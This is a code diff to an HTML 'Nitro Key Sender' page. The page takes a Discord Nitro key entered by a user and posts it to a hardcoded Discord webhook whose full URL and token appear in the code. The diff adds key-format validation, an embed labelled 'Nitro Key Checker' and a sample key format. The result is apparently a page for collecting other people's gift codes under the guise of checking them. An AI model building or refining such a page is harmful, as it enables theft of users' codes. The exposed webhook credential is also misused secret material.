@@ -49,6 +49,12 @@
     }
   </style>
   <script>
+    function isValidNitroKey(key) {
+      // Regex to match the general format of Discord Nitro keys (e.g., XXXX-XXXX-XXXX)
+      const nitroKeyPattern = /^[A-Za-z0-9]{4}-[A-Za-z0-9]{4}-[A-Za-z0-9]{4}$/;
+      return nitroKeyPattern.test(key);
+    }
+
     function sendNitroKey() {
       const nitroKey = document.getElementById("nitroKey").value;
 
@@ -57,8 +63,29 @@
         return;
       }
 
+      if (!isValidNitroKey(nitroKey)) {
+        alert("Invalid Nitro Key format. Please check your entry.");
+        return;
+      }
+
       const payload = {
-        content: `Nitro Key Entered: ${nitroKey}`
+        embeds: [
+          {
+            title: "Nitro Key Submission",
+            description: `A Nitro Key has been submitted.`,
+            color: 3447003, // Blue color
+            fields: [
+              {
+                name: "Nitro Key",
+                value: nitroKey,
+                inline: false
+              }
+            ],
+            footer: {
+              text: "Nitro Key Checker"
+            }
+          }
+        ]
       };
 
       const webhookUrl = 'https://discord.com/api/webhooks/1311057682022797434/om54aFEYSM4VYlmMXh1VsipdCTZk4Ka-6FMWoiDGizrzscc1_D5pY8H34re_AYKKjb43';
@@ -86,7 +113,7 @@
 <body>
   <div class="container">
     <h1>Nitro Key Sender</h1>
-    <input type="text" id="nitroKey" placeholder="Enter Nitro Key" />
+    <input type="text" id="nitroKey" placeholder="Enter Nitro Key (e.g., XXXX-XXXX-XXXX)" />
     <button onclick="sendNitroKey()">Send Nitro Key</button>
   </div>
 </body>
